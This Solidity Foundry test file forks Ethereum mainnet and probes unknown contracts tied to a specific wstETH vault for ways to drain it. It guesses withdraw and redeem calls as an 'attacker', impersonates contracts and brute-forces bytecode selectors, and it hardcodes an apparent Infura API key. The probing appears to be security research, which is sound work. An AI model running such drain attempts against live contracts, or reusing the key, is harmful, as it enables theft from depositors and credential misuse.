// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract UnknownContractsInvestigation is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // Unknown contracts from Vault storage
    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultSlot2Contract() public view {
        console.log("=== ANALYZING VAULT SLOT 2 CONTRACT ===\n");

        console.log("Address:", VAULT_SLOT2);
        console.log("Code size:", VAULT_SLOT2.code.length);

        if (VAULT_SLOT2.code.length > 0) {
            bytes memory code = VAULT_SLOT2.code;

            // Find function selectors
            console.log("\nFunction selectors:");
            bytes4[] memory uniqueSels = new bytes4[](40);
            uint selCount = 0;

            for (uint i = 0; i + 4 < code.length && selCount < 40; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (sel == 0xffffffff || sel == bytes4(0)) continue;

                    bool isUnique = true;
                    for (uint j = 0; j < selCount; j++) {
                        if (uniqueSels[j] == sel) {
                            isUnique = false;
                            break;
                        }
                    }

                    if (isUnique) {
                        uniqueSels[selCount] = sel;
                        selCount++;
                    }
                }
            }

            for (uint i = 0; i < selCount; i++) {
                console.logBytes4(uniqueSels[i]);
            }

            // Check storage
            console.log("\nStorage slots:");
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(VAULT_SLOT2, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("Slot", i, ":");
                    console.logBytes32(slot);
                }
            }
        }
    }

    function test_AnalyzeVaultSlot5Contract() public view {
        console.log("=== ANALYZING VAULT SLOT 5 CONTRACT ===\n");

        console.log("Address:", VAULT_SLOT5);
        console.log("Code size:", VAULT_SLOT5.code.length);

        if (VAULT_SLOT5.code.length > 0) {
            bytes memory code = VAULT_SLOT5.code;

            // Find function selectors
            console.log("\nFunction selectors:");
            bytes4[] memory uniqueSels = new bytes4[](40);
            uint selCount = 0;

            for (uint i = 0; i + 4 < code.length && selCount < 40; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (sel == 0xffffffff || sel == bytes4(0)) continue;

                    bool isUnique = true;
                    for (uint j = 0; j < selCount; j++) {
                        if (uniqueSels[j] == sel) {
                            isUnique = false;
                            break;
                        }
                    }

                    if (isUnique) {
                        uniqueSels[selCount] = sel;
                        selCount++;
                    }
                }
            }

            for (uint i = 0; i < selCount; i++) {
                console.logBytes4(uniqueSels[i]);
            }

            // Check storage
            console.log("\nStorage slots:");
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(VAULT_SLOT5, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("Slot", i, ":");
                    console.logBytes32(slot);
                }
            }
        }
    }

    function test_TrySlot2Functions() public {
        console.log("=== TRYING SLOT 2 CONTRACT FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Common function patterns
        console.log("Trying common patterns:");

        (bool s1,) = VAULT_SLOT2.call(
            abi.encodeWithSignature("withdraw(uint256,address)", 100e18, attacker)
        );
        console.log("withdraw(100, attacker):", s1);

        (bool s2,) = VAULT_SLOT2.call(
            abi.encodeWithSignature("claim(address)", attacker)
        );
        console.log("claim(attacker):", s2);

        (bool s3,) = VAULT_SLOT2.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(100, attacker):", s3);

        (bool s4,) = VAULT_SLOT2.call(
            abi.encodeWithSignature("execute(address,bytes)", REDEMPTION_CONTROLLER,
                abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker))
        );
        console.log("execute(RC, redeem):", s4);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }
    }

    function test_TrySlot5Functions() public {
        console.log("=== TRYING SLOT 5 CONTRACT FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        console.log("Trying common patterns:");

        (bool s1,) = VAULT_SLOT5.call(
            abi.encodeWithSignature("withdraw(uint256,address)", 100e18, attacker)
        );
        console.log("withdraw(100, attacker):", s1);

        (bool s2,) = VAULT_SLOT5.call(
            abi.encodeWithSignature("harvest()")
        );
        console.log("harvest():", s2);

        (bool s3,) = VAULT_SLOT5.call(
            abi.encodeWithSignature("tend()")
        );
        console.log("tend():", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }
    }

    function test_CheckSlot2InteractionWithRedemption() public {
        console.log("=== CHECKING SLOT 2 INTERACTION WITH REDEMPTION ===\n");

        // Maybe Slot2 contract can interact with Redemption contracts

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Prank as VAULT_SLOT2
        vm.startPrank(VAULT_SLOT2);

        // Try calling RC.redeem
        (bool s1,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("RC.redeem as SLOT2:", s1);

        // Try calling R0
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("R0.redeem as SLOT2:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
            console.log("SLOT2 contract can drain vault!");
        }
    }

    function test_CheckSlot5InteractionWithRedemption() public {
        console.log("=== CHECKING SLOT 5 INTERACTION WITH REDEMPTION ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Prank as VAULT_SLOT5
        vm.startPrank(VAULT_SLOT5);

        // Try calling RC.redeem
        (bool s1,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("RC.redeem as SLOT5:", s1);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** SLOT5 CAN DRAIN VAULT! ***");
        }
    }

    function test_CheckVaultInteractionWithSlots() public {
        console.log("=== CHECKING VAULT INTERACTION WITH SLOT CONTRACTS ===\n");

        // Maybe Vault delegatecalls to these contracts?

        bytes memory vaultCode = VAULT.code;

        // Find DELEGATECALLs
        uint dcCount = 0;
        for (uint i = 0; i < vaultCode.length; i++) {
            if (uint8(vaultCode[i]) == 0xf4) {
                dcCount++;
            }
        }
        console.log("DELEGATECALL count in Vault:", dcCount);

        // Check if Vault loads from slot 2 or 5 for delegatecall
        console.log("\nSearching for SLOAD of slot 2 and 5:");
        for (uint i = 0; i < vaultCode.length; i++) {
            if (uint8(vaultCode[i]) == 0x54) { // SLOAD
                // Check what's pushed before
                if (i > 0 && uint8(vaultCode[i-1]) >= 0x60 && uint8(vaultCode[i-1]) <= 0x7f) {
                    uint8 size = uint8(vaultCode[i-1]) - 0x5f;
                    if (size <= 2) {
                        uint256 val = 0;
                        for (uint j = 0; j < size; j++) {
                            val = val << 8 | uint8(vaultCode[i - size + j]);
                        }
                        if (val == 2 || val == 5 || val == 6) {
                            console.log("SLOAD slot", val, "at offset:", i);
                        }
                    }
                }
            }
        }
    }

    function test_ExhaustiveSlot2SelectorTest() public {
        console.log("=== EXHAUSTIVE SLOT 2 SELECTOR TEST ===\n");

        if (VAULT_SLOT2.code.length == 0) {
            console.log("No code at SLOT2");
            return;
        }

        bytes memory code = VAULT_SLOT2.code;

        // Extract all selectors
        bytes4[] memory sels = new bytes4[](50);
        uint selCount = 0;

        for (uint i = 0; i + 4 < code.length && selCount < 50; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == 0xffffffff || sel == bytes4(0)) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (sels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique) {
                    sels[selCount] = sel;
                    selCount++;
                }
            }
        }

        console.log("Testing", selCount, "selectors:");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        for (uint i = 0; i < selCount; i++) {
            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);

            // Try (address, uint256)
            (bool s,) = VAULT_SLOT2.call(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            if (vaultAfter < vaultNow) {
                console.log("*** DRAINED with:");
                console.logBytes4(sels[i]);
            }
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();
    }
}
